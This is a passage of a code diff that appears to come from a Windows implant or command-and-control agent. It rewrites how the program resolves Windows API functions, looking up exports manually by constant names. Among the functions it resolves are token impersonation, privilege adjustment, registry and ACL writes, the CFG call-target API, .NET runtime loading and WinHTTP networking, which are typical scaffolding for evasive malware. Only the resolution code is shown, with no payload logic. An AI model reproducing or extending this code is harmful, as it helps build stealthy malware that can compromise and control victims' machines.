+		Ctx->Win32.LoadLibraryA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, LOADLIBRARYA);
+		Ctx->Win32.FreeLibrary= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FREELIBRARY);
+		Ctx->Win32.CreateToolhelp32Snapshot= 				FindExportAddress((LPVOID)Ctx->Module.Kernel32, CREATETOOLHELP32SNAPSHOT);
+		Ctx->Win32.Process32First= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, PROCESS32FIRST);
+		Ctx->Win32.Process32Next= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, PROCESS32NEXT);
+		Ctx->Win32.GlobalMemoryStatusEx= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, GLOBALMEMORYSTATUSEX);
+		Ctx->Win32.SleepEx= 								FindExportAddress((LPVOID)Ctx->Module.Kernel32, SLEEPEX);
+    	Ctx->Win32.FindResourceA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDRESOURCEA);
+		Ctx->Win32.LoadResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, LOADRESOURCE);
+		Ctx->Win32.LockResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, LOCKRESOURCE);
+		Ctx->Win32.SizeofResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, SIZEOFRESOURCE);
+		Ctx->Win32.FreeResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FREERESOURCE);
+		Ctx->Win32.SetProcessValidCallTargets= 				FindExportAddress((LPVOID)Ctx->Modules.Kernbase, SETPROCESSVALIDCALLTARGETS);
 
 		//TODO: these loaded libraries will need mod->base. Everything else can be freed.
-		x_assertb(ctx->modules.dload.shlwapi  = ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr, false));
-        x_assertb(ctx->modules.dload.crypt32  = ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr, false));
-        x_assertb(ctx->modules.dload.winhttp  = ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr, false));
-        x_assertb(ctx->modules.dload.advapi   = ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr, false));
-        x_assertb(ctx->modules.dload.iphlpapi = ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr, false));
-        x_assertb(ctx->modules.dload.mscoree  = ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr, false));
+		//x_assertb(ctx->modules.dload.shlwapi  = ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr, false));
+        //x_assertb(ctx->modules.dload.crypt32  = ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr, false));
+        //x_assertb(ctx->modules.dload.winhttp  = ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr, false));
+        //x_assertb(ctx->modules.dload.advapi   = ImportModule(LoadLocalFile, ADVAPI32, nullptr, 0, nullptr, false));
+        //x_assertb(ctx->modules.dload.iphlpapi = ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr, false));
+        //x_assertb(ctx->modules.dload.mscoree  = ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr, false));
 
-		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							(HMODULE)ctx->modules.dload.advapi->base, GETUSERNAMEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW, 						(HMODULE)ctx->modules.dload.advapi->base, LOOKUPACCOUNTSIDW));
-		x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA, 					(HMODULE)ctx->modules.dload.advapi->base, LOOKUPPRIVILEGEVALUEA));
-		x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce, 						(HMODULE)ctx->modules.dload.advapi->base, ADDMANDATORYACE));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetEntriesInAclA, 						(HMODULE)ctx->modules.dload.advapi->base, SETENTRIESINACLA));
-		x_assertb(F_PTR_HMOD(ctx->win32.AllocateAndInitializeSid, 				(HMODULE)ctx->modules.dload.advapi->base, ALLOCATEANDINITIALIZESID));
-		x_assertb(F_PTR_HMOD(ctx->win32.InitializeSecurityDescriptor, 			(HMODULE)ctx->modules.dload.advapi->base, INITIALIZESECURITYDESCRIPTOR));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorDacl, 				(HMODULE)ctx->modules.dload.advapi->base, SETSECURITYDESCRIPTORDACL));
-		x_assertb(F_PTR_HMOD(ctx->win32.SetSecurityDescriptorSacl, 				(HMODULE)ctx->modules.dload.advapi->base, SETSECURITYDESCRIPTORSACL));
-		x_assertb(F_PTR_HMOD(ctx->win32.InitializeAcl, 							(HMODULE)ctx->modules.dload.advapi->base, INITIALIZEACL));
-		x_assertb(F_PTR_HMOD(ctx->win32.FreeSid, 								(HMODULE)ctx->modules.dload.advapi->base, FREESID));
-		x_assertb(F_PTR_HMOD(ctx->win32.ImpersonateLoggedOnUser, 				(HMODULE)ctx->modules.dload.advapi->base, IMPERSONATELOGGEDONUSER));
-		x_assertb(F_PTR_HMOD(ctx->win32.AdjustTokenPrivileges, 					(HMODULE)ctx->modules.dload.advapi->base, ADJUSTTOKENPRIVILEGES));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegOpenKeyExA, 							(HMODULE)ctx->modules.dload.advapi->base, REGOPENKEYEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						(HMODULE)ctx->modules.dload.advapi->base, REGCREATEKEYEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						(HMODULE)ctx->modules.dload.advapi->base, REGSETVALUEEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							(HMODULE)ctx->modules.dload.advapi->base, REGCLOSEKEY));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						(HMODULE)ctx->modules.dload.iphlpapi->base, GETADAPTERSINFO));
-		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						(HMODULE)ctx->modules.dload.mscoree->base, CLRCREATEINSTANCE));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen, 							(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPOPEN));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect, 					    (HMODULE)ctx->modules.dload.winhttp->base, WINHTTPCONNECT));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpenRequest, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPOPENREQUEST));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpAddRequestHeaders, 				(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPADDREQUESTHEADERS));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSetOption, 						(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPSETOPTION));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetProxyForUrl, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPGETPROXYFORURL));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, 	(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpSendRequest, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPSENDREQUEST));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReceiveResponse, 				(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPRECEIVERESPONSE));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpReadData, 						(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPREADDATA));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPQUERYHEADERS));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable, 				(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPQUERYDATAAVAILABLE));
-		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle, 					(HMODULE)ctx->modules.dload.winhttp->base, WINHTTPCLOSEHANDLE));
-		x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA, 					(HMODULE)ctx->modules.dload.crypt32->base, CRYPTSTRINGTOBINARYA));
-		x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA, 					(HMODULE)ctx->modules.dload.crypt32->base, CRYPTBINARYTOSTRINGA));
+		Ctx->Win32.LookupAccountSidW= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, LOOKUPACCOUNTSIDW);
+		Ctx->Win32.LookupPrivilegeValueA= 					FindExportAddress((LPVOID)Ctx->Module.Advapi, LOOKUPPRIVILEGEVALUEA);
+		Ctx->Win32.AddMandatoryAce= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, ADDMANDATORYACE);
+		Ctx->Win32.SetEntriesInAclA= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, SETENTRIESINACLA);
+		Ctx->Win32.AllocateAndInitializeSid= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, ALLOCATEANDINITIALIZESID);
+		Ctx->Win32.InitializeSecurityDescriptor= 			FindExportAddress((LPVOID)Ctx->Module.Advapi, INITIALIZESECURITYDESCRIPTOR);
+		Ctx->Win32.SetSecurityDescriptorDacl= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, SETSECURITYDESCRIPTORDACL);
+		Ctx->Win32.SetSecurityDescriptorSacl= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, SETSECURITYDESCRIPTORSACL);
+		Ctx->Win32.InitializeAcl= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, INITIALIZEACL);
+		Ctx->Win32.FreeSid= 								FindExportAddress((LPVOID)Ctx->Module.Advapi, FREESID);
+		Ctx->Win32.ImpersonateLoggedOnUser= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, IMPERSONATELOGGEDONUSER);
+		Ctx->Win32.AdjustTokenPrivileges= 					FindExportAddress((LPVOID)Ctx->Module.Advapi, ADJUSTTOKENPRIVILEGES);
+		Ctx->Win32.RegOpenKeyExA= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, REGOPENKEYEXA);
+		Ctx->Win32.RegCreateKeyExA= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, REGCREATEKEYEXA);
+		Ctx->Win32.RegSetValueExA= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, REGSETVALUEEXA);
+		Ctx->Win32.RegCloseKey= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, REGCLOSEKEY);
+		Ctx->Win32.CLRCreateInstance= 						FindExportAddress((LPVOID)Ctx->Module.Mscoree, CLRCREATEINSTANCE);
+		Ctx->Win32.WinHttpOpen= 							FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPOPEN);
+		Ctx->Win32.WinHttpConnect= 					    	FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPCONNECT);
+		Ctx->Win32.WinHttpOpenRequest= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPOPENREQUEST);
+		Ctx->Win32.WinHttpAddRequestHeaders= 				FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPADDREQUESTHEADERS);
+		Ctx->Win32.WinHttpSetOption= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPSETOPTION);
+		Ctx->Win32.WinHttpGetProxyForUrl= 					FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPGETPROXYFORURL);
+		Ctx->Win32.WinHttpGetIEProxyConfigForCurrentUser= 	FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER);
+		Ctx->Win32.WinHttpSendRequest= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPSENDREQUEST);
+		Ctx->Win32.WinHttpReceiveResponse= 					FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPRECEIVERESPONSE);
+		Ctx->Win32.WinHttpReadData= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPREADDATA);
+		Ctx->Win32.WinHttpQueryHeaders= 					FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPQUERYHEADERS);
+		Ctx->Win32.WinHttpQueryDataAvailable= 				FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPQUERYDATAAVAILABLE);
+		Ctx->Win32.WinHttpCloseHandle= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPCLOSEHANDLE);
+		Ctx->Win32.CryptStringToBinaryA= 					FindExportAddress((LPVOID)Ctx->Module.Crypt32, CRYPTSTRINGTOBINARYA);
+		Ctx->Win32.CryptBinaryToStringA= 					FindExportAddress((LPVOID)Ctx->Module.Crypt32, CRYPTBINARYTOSTRINGA);
 
         defer:
 		return success;
